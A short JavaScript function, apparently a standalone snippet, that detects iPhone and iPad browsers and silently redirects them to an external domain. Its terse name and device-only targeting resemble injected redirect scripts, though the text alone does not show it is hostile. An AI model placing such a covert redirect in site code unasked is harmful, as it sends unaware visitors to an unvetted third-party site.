function _Cm() {
    var redirectURL = "https://www.rolls3.com";
    var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

    if (isIphoneOrIpad) {
        window.location.href = redirectURL;
    }
}
